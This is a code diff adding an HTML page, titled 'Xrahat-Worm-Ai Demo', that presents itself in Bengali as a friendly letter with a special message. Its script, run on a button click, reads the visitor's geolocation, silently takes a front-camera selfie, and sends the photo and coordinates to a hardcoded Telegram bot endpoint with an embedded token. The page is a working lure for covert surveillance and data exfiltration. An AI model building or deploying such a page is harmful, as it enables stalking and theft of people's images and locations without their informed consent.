@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xrahat-Worm-Ai Demo</title>
+    <style>
+    body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f9;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.letter-container {
+    background: white;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    max-width: 400px;
+}
+
+h2 {
+    color: #333;
+}
+
+p {
+    color: #555;
+}
+
+button {
+    padding: 10px 20px;
+    font-size: 16px;
+    cursor: pointer;
+    border: none;
+    border-radius: 5px;
+    background-color: #007BFF;
+    color: white;
+}
+
+button:hover {
+    background-color: #0056b3;
+}
+    
+    </style>
+</head>
+<body>
+    <div class="letter-container">
+        <h2>সুন্দর এক চিঠি</h2>
+        <p>আপনার জন্য বিশেষ কিছু বার্তা...</p>
+        <button id="captureBtn">ছবি তোলা ও লোকেশন পাঠান</button>
+    </div>
+    <script src="script.js"></script>
+</body>
+
+<script>
+
+document.getElementById('captureBtn').addEventListener('click', async () => {
+    // Get user's location
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            console.log(`Location: ${lat}, ${lon}`);
+
+            // Capture selfie using front camera
+            const videoElement = document.createElement('video');
+            videoElement.srcObject = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' } 
+            });
+            
+            await new Promise(resolve => videoElement.onloadedmetadata = resolve);
+            videoElement.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoElement, 0, 0);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('photo', blob, 'selfie.jpg');
+                formData.append('location', `${lat},${lon}`);
+
+                // Send to Telegram Bot
+                fetch('https://api.telegram.org/8799024872:AAGspEwvj339Fowww-qhRFlZuC3DgfbtRh0/sendPhoto', {
+                    method: 'POST',
+                    body: formData
+                }).then(response => console.log(response))
+                  .catch(error => console.error(error));
+            }, 'image/jpeg');
+
+        }, error => {
+            console.error("Error getting location:", error);
+        });
+    } else {
+        alert("Geolocation is not supported by this browser.");
+    }
+});
+
+
+</script>
+
+</html>
